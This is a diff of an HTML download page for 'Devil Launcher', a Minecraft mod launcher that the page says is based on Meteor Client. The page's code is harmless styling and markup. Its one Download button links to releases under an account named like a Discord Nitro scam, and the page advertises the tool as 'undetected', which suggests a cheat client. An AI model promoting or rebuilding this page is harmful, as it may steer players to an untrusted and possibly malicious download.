@@ -1,17 +1,84 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Minecraft devil launcher</title>
+    <title>Devil Launcher</title>
+
+    <style>
+        body {
+            margin: 0;
+            min-height: 100vh;
+
+            /* Red sides fading to black center */
+            background: linear-gradient(
+                90deg,
+                #7a0000 0%,
+                #300000 20%,
+                #000000 50%,
+                #300000 80%,
+                #7a0000 100%
+            );
+
+            color: white;
+            font-family: Arial, sans-serif;
+
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+        }
+
+        .container {
+            max-width: 800px;
+            padding: 20px;
+        }
+
+        h1 {
+            font-size: 72px;
+            margin-bottom: 15px;
+            text-shadow: 0 0 20px rgba(255, 0, 0, 0.5);
+        }
+
+        p {
+            font-size: 22px;
+            color: #d0d0d0;
+            line-height: 1.6;
+            margin-bottom: 35px;
+        }
+
+        .download-btn {
+            display: inline-block;
+            padding: 15px 35px;
+            background: #cc0000;
+            color: white;
+            text-decoration: none;
+            border-radius: 10px;
+            font-size: 20px;
+            font-weight: bold;
+            transition: 0.3s;
+        }
+
+        .download-btn:hover {
+            background: #ff0000;
+            box-shadow: 0 0 20px red;
+        }
+    </style>
 </head>
-<body style="font-family: Arial; text-align: center; background: #111; color: white;">
+<body>
 
-    <h1>Minecraft Devil Launcher</h1>
-    <p>A simple Minecraft client / launcher project</p>
+    <div class="container">
+        <h1>Devil Launcher</h1>
 
-    <a href="https://github.com/discord-nitroclaim-1-year/Minecraft-devil-launcher/releases" 
-       style="padding: 10px 20px; background: green; color: white; text-decoration: none; border-radius: 8px;">
-       Download
-    </a>
+        <p>
+            A mod launcher for Minecraft based on Meteor Client,
+            featuring BetterMod integration and designed to remain
+            lightweight, powerful, and undetected.
+        </p>
+
+        <a class="download-btn"
+           href="https://github.com/discord-nitroclaim-1-year/Minecraft-devil-launcher/releases">
+            Download
+        </a>
+    </div>
 
 </body>
 </html>
